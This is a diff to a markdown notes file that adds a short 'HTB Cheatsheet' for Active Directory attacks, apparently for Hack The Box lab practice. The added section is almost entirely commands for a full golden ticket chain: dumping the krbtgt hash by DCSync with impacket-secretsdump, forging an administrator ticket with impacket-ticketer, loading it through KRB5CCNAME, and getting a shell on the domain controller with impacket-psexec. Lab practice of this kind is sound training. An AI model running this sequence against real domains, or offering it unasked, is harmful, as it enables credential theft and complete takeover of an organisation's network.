@@ -67,3 +67,26 @@ impacket-lookupsid domain.local/user:Password123!@<DC_IP>
 ```
 
 Or use the domain SID shown in BloodHound/domain enumeration.
+
+---
+
+# HTB Cheatsheet
+
+# Get krbtgt hash first via DCSync
+```
+impacket-secretsdump domain.htb/admin:pass@10.10.10.X -just-dc-user {krbtgt}
+```
+
+# Create golden ticket
+```
+impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-... -domain domain.htb administrator
+```
+
+# Use it
+```
+export KRB5CCNAME=administrator.ccache
+```
+
+```
+impacket-psexec -k -no-pass domain.htb/administrator@dc.domain.htb
+```
